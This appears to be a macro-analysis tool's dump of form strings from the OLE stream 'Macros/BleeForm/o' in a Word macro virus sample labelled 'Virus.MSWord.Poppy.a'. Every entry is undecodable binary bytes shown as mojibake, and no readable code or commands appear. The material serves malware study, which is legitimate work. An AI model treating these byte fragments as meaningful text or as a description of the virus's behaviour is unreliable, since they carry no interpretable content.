- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a:ʂ2�T�Ժ���F��铎�ͪb�X�lkAY_pJ���r��S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ܸp���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m�m��CG-��(�#���	da���&��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'�9=@2�Z�4Y_p�y%3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���tb���ܭ���Y���S��N�
���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�<u܏ �e8Ǹ��	�o${��Fɤ螽��=�Z�\i�[mK(�P���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3��8>�h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`�GU��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;w�^-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� @�g�F�
pF�q�FFa3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ǿS7�n��;ga��B�R̒<�p�F�I%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;�u��^�k9�xKs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}}|֨�]wڽQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]iE3���$G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#�
>c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
u_�ir�kZ[�9ae�;n)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j3�g#�3Ϧz����-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g���e��[�6h��*�<�q�F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� �1ԯf�&�P�k�n*ʣ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�d�وʒU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����dl��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ޱ�c�~��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����]����EM��Z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��c��N��^n@��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
±$d`����߬���ݛ�������N���KY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��lz�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~��tL�B�7{zu|�w�Z�P�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�ߔ�`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o��䃠q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���/��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s0"�ع��#Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��^K2��F�R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Fb%ryQ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�靤*!���,�5X	<{~��=��uJ��錱�K)�T7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
HD/]��^��*i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C��}�9���YҚB=5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��=���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���J�ۓ�F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ܵ�*�d��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^��h9���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y%���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z�m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A����wh
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:;,1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����;f��I9d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{3VS:,"^9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n�.�����c�:#BM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ϊ�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Zțr���oB�($
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S��f�l�T*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����yД
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
UB�f��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z�Y6,���X{��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Fa1�hA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����ᇥ{%Zn=��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^��f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
mUoj(��@����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�q�=:�/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ri(;]i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,��ѨJy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`c �:�:�Î��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:W��K6� s�����.������Q�Oؠ��.�Ա�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:�̇�e�v�;��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@�����bvq7�-[-��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���l��E�?�����L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1L8���*ՠ�(�h�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@_G�����Kp���w����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� �!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9�	�pC4n�4UY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D��)i�,Aןn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�A8�n<tq��G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d�>�����Miz1��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
IB®dD�Te�]Lm֙�Z��Q�K`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?�X����:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��؝+r��T^V�%�(�ʬ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
OZ��ߺQ��5YQ=^Б9�`3���Xգ�%?y<Vk_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G����$�֬pL��?�@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��T���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sx�GA�Qx�X�)���z�+�����:ݤ4��FKu46�m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;^I>U�(���.I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�OJ:"�[�m#o��V��]-M��^����)cU�S8���B�,{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1lB�~�O��,UQ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m�ۑ;G��1��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)D8,�Ρ�Xj�IAf���ѩ���	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n�B/>F�C�;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?8�Q���_��*2�l1{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�$����^�(���k��Y��qs��+CN�P[xd�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �T�.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���AT��-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\�55MEA"�Hܸ�!��Q��@#�����tWZ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����b#�X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t�+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=~��S3]�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E4��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��β�W�*ɞv�4FnRG�+f����n�X��q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R<u�Z�P�d���d+�"K�w�R3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Z���P�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:!�(�Ybٴm*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y�=&�]kU���S%|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-Dl�W:2��6p��,m����bߔa�n�:"�C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@�E4�)V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3���yx
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-���̪�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a���IL��0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ל����C\$	!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pz'4�T�9�=l�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���2ȁ@
G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�bXg��e�f�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
䓃�:�Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,��T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Ϡ�M�R����ԅz�1�Iv�h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+�}H\~Rz���GN�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z�t��w���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�NpJ�3��>!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y '�o5�~��n�ub�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JH�`!@���h������,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XϽ��}�PJ��/������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@h�
���<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Uz�R���fZ7h]��Ł���2�v���p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>���/G|��[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��X�H��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�H�
� ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Poppy.a' - OLE stream: 'Macros/BleeForm/o'
